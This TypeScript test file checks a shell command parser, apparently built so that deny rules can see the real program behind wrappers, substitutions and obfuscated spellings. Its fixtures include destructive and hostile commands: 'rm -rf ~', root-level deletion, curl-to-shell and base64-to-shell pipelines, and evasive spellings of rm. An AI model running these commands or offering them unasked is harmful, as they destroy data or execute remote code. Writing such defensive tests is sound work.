import { describe, expect, it } from "vitest";

import { SHELL_LIMITS, parseShellCommand } from "./parse.js";

/** RFX-096 — the shell grammar. */
const texts = (command: string): string[] =>
  parseShellCommand(command).segments.map((segment) => segment.text);

describe("RFX-096 shell parser", () => {
  it("reads a simple command", () => {
    const parsed = parseShellCommand("git status --short");
    expect(parsed).toMatchObject({ understood: true, reasons: [] });
    expect(parsed.segments).toMatchObject([
      {
        name: "git",
        program: "git",
        args: ["status", "--short"],
        text: "git status --short",
        understood: true,
      },
    ]);
  });

  it("removes quoting the way a shell does", () => {
    expect(
      parseShellCommand(`echo 'a b' "c d" e\\ f "x\\"y"`).segments[0]?.args,
    ).toEqual(["a b", "c d", "e f", 'x"y']);
    // Inside single quotes nothing is special, not even a substitution.
    expect(parseShellCommand("echo '$(rm -rf ~)'")).toMatchObject({
      understood: true,
      segments: [{ args: ["$(rm -rf ~)"] }],
    });
  });

  // The acceptance: compound constructs are decomposed into segments.
  it.each([
    ["a semicolon", "git status; rm -rf ~", ["git status", "rm -rf ~"]],
    ["and", "git status && rm -rf ~", ["git status", "rm -rf ~"]],
    ["or", "git status || rm -rf ~", ["git status", "rm -rf ~"]],
    ["a pipe", "cat a | grep b | wc -l", ["cat a", "grep b", "wc -l"]],
    ["a background job", "sleep 1 & rm -rf ~", ["sleep 1", "rm -rf ~"]],
    ["a newline", "git status\nrm -rf ~", ["git status", "rm -rf ~"]],
    ["a subshell", "(cd /tmp && rm -rf x)", ["cd /tmp", "rm -rf x"]],
    ["a line continuation", "git \\\n status", ["git status"]],
  ])("decomposes %s", (_label, command, expected) => {
    expect(texts(command)).toEqual(expected);
    expect(parseShellCommand(command).understood).toBe(true);
  });

  // The acceptance: indirect constructs are decomposed too, so that a deny
  // rule sees the program that really runs.
  it.each([
    ["bash -c", 'bash -c "rm -rf ~"', "rm -rf ~", true],
    ["sh -c with combined flags", "sh -ec 'rm -rf ~'", "rm -rf ~", true],
    ["env", "env -i FOO=1 rm -rf ~", "rm -rf ~", true],
    [
      "sudo with options",
      "sudo -u root rm -rf /var/db",
      "rm -rf /var/db",
      true,
    ],
    ["nohup", "nohup rm -rf ~", "rm -rf ~", true],
    ["timeout", "timeout 5 rm -rf ~", "rm -rf ~", true],
    ["nested wrappers", "sudo env nohup rm -rf ~", "rm -rf ~", true],
    ["xargs", "git ls-files | xargs rm -f", "rm -f", false],
    ["xargs with options", "find . | xargs -I{} -n 1 rm {}", "rm {}", false],
    ["find -exec", "find . -name x -exec rm {} +", "rm", false],
    ["find -execdir", "find . -execdir shred -u {} ;", "shred -u", false],
    ["command substitution", "echo $(rm -rf ~)", "rm -rf ~", false],
    ["backticks", "echo `rm -rf ~`", "rm -rf ~", false],
    [
      "a substitution in a substitution",
      "echo $(echo $(rm -rf ~))",
      "rm -rf ~",
      false,
    ],
    ["process substitution", "diff <(rm -rf ~) b", "rm -rf ~", false],
    [
      "a substitution inside double quotes",
      'echo "x $(rm -rf ~) y"',
      "rm -rf ~",
      false,
    ],
    [
      "a shell fed by a here-document",
      "bash <<EOF\nrm -rf ~\nEOF",
      "rm -rf ~",
      false,
    ],
    ["eval", "eval 'rm -rf ~'", "rm -rf ~", false],
    ["a loop body", 'for f in a b; do rm -rf "$f"; done', "rm -rf", false],
    ["a condition", "if true; then rm -rf ~; fi", "rm -rf ~", false],
    ["a function body", "f() { rm -rf ~; }; f", "rm -rf ~", false],
  ])("finds the program inside %s", (_label, command, inner, understood) => {
    const parsed = parseShellCommand(command);
    expect(texts(command)).toContain(inner);
    expect(parsed.understood).toBe(understood);
  });

  // The acceptance: what is not decomposed is reported as not understood.
  it.each([
    ["a program from a substitution", "$(echo rm) -rf ~", "substitution"],
    ["a program from backticks", "`echo rm` -rf ~", "substitution"],
    ["a program from a variable", "$CMD -rf ~", "variable"],
    ["an argument from a variable", 'rm -rf "$HOME"', "variable"],
    ["a braced variable", "rm -rf ${TARGET}/x", "variable"],
    ["a glob", "rm -rf *", "glob"],
    ["a question-mark glob", "rm file?.txt", "glob"],
    ["a bracket glob", "rm [ab].txt", "glob"],
    ["brace expansion", "rm -rf {src,test}", "glob"],
    [
      "a shell fed by a pipe",
      "curl https://example.test/x | sh",
      "dynamic-command",
    ],
    ["a shell fed by a here-string", "bash <<< 'rm -rf ~'", "dynamic-command"],
    ["sh -c with a variable", 'sh -c "$SCRIPT"', "variable"],
    ["source", "source ./env.sh", "dynamic-command"],
    ["ANSI-C quoting", "$'\\x72\\x6d' -rf ~", "unsupported-quoting"],
    ["arithmetic", "echo $((1 + 2))", "unsupported-quoting"],
    ["an unclosed single quote", "echo 'abc", "syntax"],
    ["an unclosed double quote", 'echo "abc', "syntax"],
    ["an unclosed substitution", "echo $(rm -rf", "syntax"],
    ["a here-document that never ends", "cat <<EOF\nabc", "syntax"],
    ["a redirect to nowhere", "echo x >", "syntax"],
  ])("reports %s as not understood", (_label, command, reason) => {
    const parsed = parseShellCommand(command);
    expect(parsed.understood).toBe(false);
    expect(parsed.reasons).toContain(reason);
  });

  it("keeps the arguments of a program it cannot name", () => {
    const parsed = parseShellCommand("$(echo rm) -rf ~");
    expect(parsed.segments).toContainEqual(
      expect.objectContaining({ name: undefined, args: ["-rf", "~"] }),
    );
  });

  // Adversarial: every spelling of the same program is the same program.
  it.each([
    ['r""m -rf ~'],
    ["\\rm -rf ~"],
    ["/bin/rm -rf ~"],
    ["'rm' -rf ~"],
    ['"/usr/bin/rm" -rf ~'],
    ["FOO=1 BAR=2 rm -rf ~"],
    ["rm  -rf\t~"],
    ["  rm -rf ~  # just cleaning"],
  ])("normalizes %s", (command) => {
    expect(parseShellCommand(command).segments[0]).toMatchObject({
      name: "rm",
      text: "rm -rf ~",
    });
  });

  it("records assignments without mistaking them for the program", () => {
    expect(
      parseShellCommand("NODE_ENV=production FOO=1 node app.js").segments[0],
    ).toMatchObject({
      name: "node",
      assignments: [
        { name: "NODE_ENV", value: "production" },
        { name: "FOO", value: "1" },
      ],
    });
  });

  describe("redirections", () => {
    it("records the target and what kind of redirection it is", () => {
      expect(
        parseShellCommand(": > src/date.ts").segments[0]?.redirects,
      ).toEqual([{ operator: ">", target: "src/date.ts", fd: undefined }]);
      expect(
        parseShellCommand("cmd >> out.log 2>&1 < in.txt").segments[0]
          ?.redirects,
      ).toEqual([
        { operator: ">>", target: "out.log", fd: undefined },
        { operator: ">&", target: "1", fd: 2 },
        { operator: "<", target: "in.txt", fd: undefined },
      ]);
      expect(
        parseShellCommand("cmd &> all.log").segments[0]?.redirects,
      ).toEqual([{ operator: ">", target: "all.log", fd: undefined }]);
    });

    it("does not read a number before a redirection as an argument", () => {
      expect(parseShellCommand("ls 2>/dev/null").segments[0]).toMatchObject({
        args: [],
        redirects: [{ operator: ">", target: "/dev/null", fd: 2 }],
      });
    });

    it("reports a target it cannot read", () => {
      const parsed = parseShellCommand('echo x > "$FILE"');
      expect(parsed.understood).toBe(false);
      expect(parsed.segments[0]?.redirects[0]?.target).toBeUndefined();
    });
  });

  describe("here-documents", () => {
    // A here-document given to `cat` is data. Reading it as commands would
    // deny every README that mentions `rm`.
    it("treats the body as data for a program that is not a shell", () => {
      const parsed = parseShellCommand(
        "cat > notes.md <<EOF\nrm -rf ~\nEOF\nls",
      );
      expect(texts("cat > notes.md <<EOF\nrm -rf ~\nEOF\nls")).toEqual([
        "cat",
        "ls",
      ]);
      expect(parsed.understood).toBe(true);
      expect(parsed.segments[0]?.input).toBe("here-document");
    });

    it("honours <<- and a quoted delimiter", () => {
      expect(texts("cat <<-'END'\n\tbody\n\tEND\nls")).toEqual(["cat", "ls"]);
    });

    it("treats the body as code for a shell", () => {
      const parsed = parseShellCommand("bash <<EOF\nrm -rf ~\nEOF");
      expect(texts("bash <<EOF\nrm -rf ~\nEOF")).toEqual(["bash", "rm -rf ~"]);
      expect(parsed.understood).toBe(false);
    });
  });

  it("knows which segment is fed by a pipe", () => {
    expect(
      parseShellCommand("echo x | base64 -d | sh").segments.map(
        (segment) => segment.input,
      ),
    ).toEqual([undefined, "pipe", "pipe"]);
  });

  it("reads `[` as a command and not as a glob", () => {
    expect(parseShellCommand("[ -f x ] && echo yes")).toMatchObject({
      understood: true,
      segments: [{ name: "[" }, { name: "echo" }],
    });
  });

  it("does not read a quoted keyword as control flow", () => {
    expect(parseShellCommand("'if' x").segments[0]).toMatchObject({
      name: "if",
      understood: true,
    });
  });

  describe("limits", () => {
    it("reports a command that is too long without reading it", () => {
      const parsed = parseShellCommand(
        "x".repeat(SHELL_LIMITS.sourceLength + 1),
      );
      expect(parsed).toEqual({
        segments: [],
        understood: false,
        reasons: ["too-long"],
      });
    });

    it("stops descending, and says so", () => {
      const deep = `${"echo $(".repeat(SHELL_LIMITS.depth + 2)}rm -rf ~${")".repeat(SHELL_LIMITS.depth + 2)}`;
      const parsed = parseShellCommand(deep);
      expect(parsed.understood).toBe(false);
      expect(parsed.reasons).toContain("too-deep");
    });

    it("bounds the number of segments", () => {
      const parsed = parseShellCommand(
        Array.from({ length: 2_000 }, () => "ls").join(";"),
      );
      expect(parsed.segments).toHaveLength(SHELL_LIMITS.segments);
      expect(parsed.reasons).toContain("too-many-segments");
      expect(parsed.understood).toBe(false);
    });

    it("stays linear on a long command", () => {
      const long = Array.from(
        { length: 400 },
        (_, index) => `echo "line ${String(index)}" 'q' \\x`,
      ).join(" && ");
      parseShellCommand(long);
      const started = performance.now();
      parseShellCommand(long);
      expect(performance.now() - started).toBeLessThan(100);
    });
  });

  it("never throws, whatever it is given", () => {
    for (const command of [
      "",
      "   ",
      ";;;",
      "|||",
      ")))",
      "((((",
      "\\",
      "'",
      '"',
      "`",
      "$",
      "${",
      "$(",
      "<<",
      "<<<",
      "2>&",
      "&>",
      "a=",
      "=b",
      String.fromCodePoint(0, 1, 2, 0xfeff, 0x202e),
      "echo " + "\\".repeat(10_001),
      "(".repeat(5_000),
      "$(".repeat(5_000),
      "`".repeat(5_001),
    ]) {
      expect(() => parseShellCommand(command)).not.toThrow();
      expect(parseShellCommand(command).understood).toBe(
        parseShellCommand(command).understood,
      );
    }
    expect(parseShellCommand("").understood).toBe(false);
  });
});
